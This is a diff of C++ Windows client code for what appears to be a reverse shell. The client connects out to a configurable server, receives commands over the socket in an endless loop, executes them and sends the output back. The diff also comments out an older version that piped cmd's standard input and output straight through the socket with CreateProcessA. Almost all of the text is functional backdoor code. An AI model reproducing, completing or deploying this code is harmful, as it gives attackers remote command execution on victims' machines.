@@ -1,7 +1,7 @@
 #include "client.hpp"
 #include "Process.hpp"
 
-Client::Client(const char* chost, unsigned short int cport) {
+Client::Client(std::wstring chost, unsigned short int cport) {
     server = chost;
     port = cport;
 }
@@ -16,19 +16,18 @@ void Client::create_socket() {
         closesocket(socket);
         WSACleanup();
     }
-    return;
 }
 
 bool Client::connect_socket() {
     // declare connect type, host, port
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
-    addr.sin_addr.s_addr = inet_addr(server);
+    InetPtonW(addr.sin_family, (const wchar_t*)server.c_str(), &addr.sin_addr.s_addr);
 
     // now connect
     printf("connecting socket\n");
     if (WSAConnect(socket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
-        printf("\nSocket connection error: %d", WSAGetLastError());
+        printf("\nSocket connection error: %d\n", WSAGetLastError());
         //closesocket(socket); //dont close socket, otherwise recreation is needes
         return false;
     }
@@ -62,7 +61,6 @@ void Client::print_output(const char* output_str)
     msg.append(output_str); msg.append("::>");
     send(socket, msg.c_str(), BUFFER_SIZE, 0);
     printf(output_str);
-    return;
 }
 
 
@@ -94,6 +92,7 @@ int Client::run_shell_commands(const char* cmd) {
     return 0; // go back to loop
 }
 
+/*
 int Client::receive_commands()
 {
     while (1) {
@@ -102,7 +101,7 @@ int Client::receive_commands()
         PROCESS_INFORMATION pinfo;
         memset(&sinfo, 0, sizeof(sinfo));
         sinfo.cb = sizeof(sinfo);
-        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+        sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
         sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)socket;
         CreateProcessA(NULL, (LPSTR)Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
         WaitForSingleObject(pinfo.hProcess, INFINITE);
@@ -122,38 +121,32 @@ int Client::receive_commands()
         }
     }
 }
-
-/*
-int Client::receive_commands() 
-{
-    ClientState st;
-    ClientState* state = &st;
-    state->bRunning = TRUE;
-    state->client = socket;
-
-    while (true) {
-        StartProcessAsync(state);
-        ReadFromSocket(state);
-
-        CloseHandle(state->hProcRead);
-        CloseHandle(state->hProcWrite);
-        CloseHandle(state->hThread);
-        CloseHandle(state->hProcess);
-
-        WaitForSingleObject(g_hReadProcThread, INFINITE);
-        break;
-    }
-    closesocket(state->client);
-    closesocket(socket);
-    WSACleanup();
-    return 0;
-}
 */
+
+int Client::receive_commands()
+{
+    while (1) 
+    {
+        // receive command
+        memset(rdata, 0, sizeof(rdata));
+        DWORD dwSockRead = 0;
+        dwSockRead = recv(socket, rdata, BUFFER_SIZE, 0);
+        if ((int)dwSockRead == SOCKET_ERROR)
+        {
+            printf("read error: %d", WSAGetLastError());
+            return 0;
+        }
+        if (strcmp(rdata, "exit\n") == 0) {
+            exit(0);
+        }
+        // run command
+        run_shell_commands(rdata);
+    }
+}
 
 // only being used for main because...
 // WSAStartup apparentally needs to count shit to clean
 void Client::close_connection() {
     closesocket(socket);
     WSACleanup();
-    return;
 }
